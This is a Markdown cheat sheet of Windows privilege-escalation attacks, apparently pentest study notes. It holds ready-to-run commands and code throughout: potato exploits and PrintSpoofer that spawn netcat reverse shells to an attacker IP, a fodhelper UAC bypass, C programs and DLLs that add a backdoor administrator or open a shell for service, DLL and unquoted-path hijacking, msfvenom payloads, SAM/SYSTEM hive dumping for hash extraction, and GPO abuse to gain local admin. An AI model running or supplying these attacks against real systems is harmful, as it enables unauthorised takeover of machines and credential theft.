## runas
runas admin
```
runas /u:USER
```

powerhsell or cmd run as admin ( GUI )
```
right click powershell or cmd -> run as admin
```
## privilege system shell
### impacket-exec
```
impacket-psexec "domain/user:pass"@x.x.x.x
```
### godpotato
shuould use all version
```
mkdir .//godpotato; cd ./godpotato; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

download
```
$IP = "ip"; $URLHOST = "http://" + $IP + ":8000/"; $PATH = "/godpotato/"; $FILE = "GodPotato-NET2.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $FILE = "GodPotato-NET35.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $FILE = "GodPotato-NET4.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile $FILE; $PATH = ""; $FILE = "nc.exe"; $URL = $URLHOST + $PATH + $FILE; iwr $URL -outfile nc.exe;
```

execute nc.exe to get reverse shell
```
.\godpotato.exe -cmd "C:/path/nc.exe -e cmd.exe $IP $PORT"
```

### sigmapotato
download
```
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
```

execute nc.exe to get reverse shell
```
.\SigmaPotato.exe "C:\Users\dave\nc.exe -e cmd.exe 192.168.45.184 4343"
```

### fodhelper
member of BUILTIN\Administrators but is running with a Medium Mandatory Level
```
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Path\To\YourPayload.exe"
Start-Process eventvwr.exe
```

### printspoofer
download
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

usage
```
.\PrintSpoofer.exe -i -c cmd
```
## Windows Services
### Service Binary Hijacking
List of services with binary path
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /i /v "C:\Windows"
```

check permissions
```
icacls PATH
```

icacls permission
```
|F|Full access
|M|Modify access
|RX|Read and execute access
|R|Read-only access
|W|Write-only access
```

adduser.c code
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

 Cross-Compile the C Code
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

then replacing the service binary
```
mv .\adduser.exe SERVICE_BINARY_PATH
```

reboot
```
shutdown /r /t 0 
```

## DLL Hijacking
### gathering application
intalled 32bit application
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

installed 64bit application
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### gathering service
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /i /v "C:\Windows"
```

check winPEASx64.exe (example)
```
================================================================================== 
    MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected
    File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [Allow: WriteData/CreateFiles])
================================================================================== 
```
### check the binary folder
```
ls binaryfolder
```

check prcomon
```

```

standard DLL search order
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

adduser code
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

reverse shell code
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,           // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved         // Reserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            system("nc.exe 192.168.x.x 4444 -e cmd.exe");
            break;
        }
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

generate msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=x -f dll -o EnterpriseServiceOptional.dll
```

Cross-Compile the C++ code
```
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

## Unquated Service Path
check unquated service
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Out-String -Width 500 |findstr /i /v "C:\WINDOWS\" | findstr /i /v '\"'
```

example
```
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

check for privilege
```
Start-Service GammaService
Stop-Service GammaService
```

find write permission
```
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

example : BUILTIN\Users:(OI)(CI)(RX,**W**) <- BUILDIN\Users has Write Permission
```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

then put Current.exe
```
mv .\adduser.exe "C:\Program Files\Enterprise Apps\Current.exe"
```

## Scheduled Tasks

get list of all scheduled tasks
```
schtasks /query /fo LIST /v
```

filtering 
```
chtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
```

or
```
get-scheduledtask | where-object { $_.Author -and $_.Author -notmatch "Microsoft" -and $_.Author -ne "N/A" } | format-table taskname, taskpath, author, state
```

get taskinfo
```
$task = Get-ScheduledTask -TaskName "TASKNAME" -TaskPath "TASKPATH"
$info = Get-ScheduledTaskInfo -TaskName "TASKNAME" -TaskPath "TASKPATH"

[PSCustomObject]@{
    TaskName       = $task.TaskName
    Author         = $task.Author
    'Task To Run'  = ($task.Actions.Execute -join ', ')
    'Run As User'  = $task.Principal.UserId
    'Next Run Time'= $info.NextRunTime
}
```

permission on the task to run path
```
icacls PATH
```

## Credential Dump
From registry
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

extract the hash
```
impacket-secretsdump -sam sam -security security -system system LOCAL
```

# Abuse GPO
 check for the permissions our current user have over the GPONAME
```
import-module .\PowerView.ps1
Get-NetGPO | select displayname
Get-GPO -Name "GPONAME"
Get-GPPermission -Guid ID -TargetType User -TargetName USERNAME
```

download sharpAbuseGPO.exe
```
wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
```

add localadmin
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount CURRENT_USER --GPOName "GPONAME"
```